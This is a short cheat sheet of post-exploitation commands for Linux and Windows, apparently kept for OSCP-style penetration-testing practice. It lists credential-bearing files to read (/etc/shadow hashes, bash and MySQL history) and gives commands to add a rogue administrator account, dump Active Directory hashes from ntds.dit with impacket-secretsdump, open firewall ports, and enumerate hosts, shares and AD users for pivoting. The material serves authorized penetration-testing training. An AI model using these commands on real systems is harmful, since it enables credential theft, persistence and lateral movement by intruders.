Linux && windows post exploitation methods 

File
+ 
Description


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~LINUX #####################
=====================
/etc/resolv.conf 

Contains the current name servers (DNS) for the system. 
This is a globally readable file that is less likely to trigger IDS alerts than /etc/passwd 
=======================
/etc/motd 

Message of the Day. 
=======================
/etc/issue 

Debian - current version of distro 
========================
/etc/passwd 

List of local users 
========================
/etc/shadow 

List of users’ passwords’ hashes (requires root) 
========================
~/.bash_history[d] 

Will give you some directory context 
========================
~/.mysql_history 

MySQL database history - could have passwords
===========================


~~~~~~~~~~~~~~~~~ WINDOWS ####################

===============================
net user username password /ADD 

net localgroup Administrators username /ADD

Add yourself as administrator.
================================
impacket-secretsdump -system 'root/Documents/OSCP/10.11.X.XXX/system.save' -ntds '/root/Documents/OSCP/10.11.X.XXX/ntds.dit' LOCAL

Dump the active directory.
================================
netsh firewall add portopening TCP 455 "Service Firewall" ENABLE ALL

Enable specific firewall ports.
==================================
- Arp -a  
- netstat -abno 
- ipconfig /all 
- route print 
- schtasks /query /fo LIST /v 
- netsh firewall show config

Look for any connections to other hosts in the lab. Here you have a pivoting opportunity.
====================================
(for /R ".\" %A in (*.txt) do echo %~fA %~zA) | findstr /v "echo

Look at text files.
======================================
Net shares

Look at file shares.
======================================
Get-ADComputer -Filter * -Properties *  | Select-Object @{Label = "Computer Name";Expression = {$_.Name}},@{Label = "Last Logon Date";Expression = {$_.LastLogonDate}} 
Get-ADUser -Filter * -Properties *  | Select-Object @{Label = "Logon Name";Expression = {$_.sAMAccountName}},  
                  @{Label = "Last LogOn Date";Expression = {$_.LastLogonDate.ToString('yyyy-MM-dd')}}, 
                  @{Label = "Created Date";Expression = {$_.whenCreated.ToString('yyyy-MM-dd')}}, 
                  @{Label = "7 Month Dormant";Expression = {if (( $_.LastLogonDate -gt 1990/01/01 -and $_.LastLogonDate -lt $time)  ) {'True'} Else {'False'}}}, 
                  @{Label = "Password Expire";Expression = {if (($_.PasswordNeverExpires -eq 'TRUE')  ) {'Enabled'} Else {'Disabled'}}}, # the 'if statement# replaces $_.Enabled 
                  @{Label = "Account Status";Expression = {if (($_.Enabled -eq 'TRUE')  ) {'Enabled'} Else {'Disabled'}}}, # the 'if statement# replaces $_.Enabled  
                  @{Label = "Admin User";Expression =  {if (($_.adminCount -eq '1')  ) {'TRUE'} Else {'FALSE'}}}, # the 'if statement# replaces $_.Enabled 
                  @{Label = "Description";Expression = {$_.Description}},  
                  @{Label = "Applications";Expression = {$_.info}}, 
                  @{Label = "First Name";Expression = {$_.GivenName}},   
                  @{Label = "Last Name";Expression = {$_.Surname}},  
                  @{Label = "Display Name";Expression = {$_.DisplayName}}, 
                  @{Label = "Job Title";Expression = {$_.Title}},  
                  @{Label = "Company";Expression = {$_.Company}}, 
                  @{Label = "Department";Expression = {$_.Department}},  
                  @{Label = "Office";Expression = {$_.OfficeName}},  
                  @{Label = "Phone";Expression = {$_.telephoneNumber}},  
                  @{Label = "Email";Expression = {$_.Mail}}
                  
 Enumerate users and computers using powershell.
 ==========================================
 http://hackingandsecurity.blogspot.com/2017/09/oscp-windows-post-exploitation.html 
 
 Windows guide for post exploitation.
 =========================================


















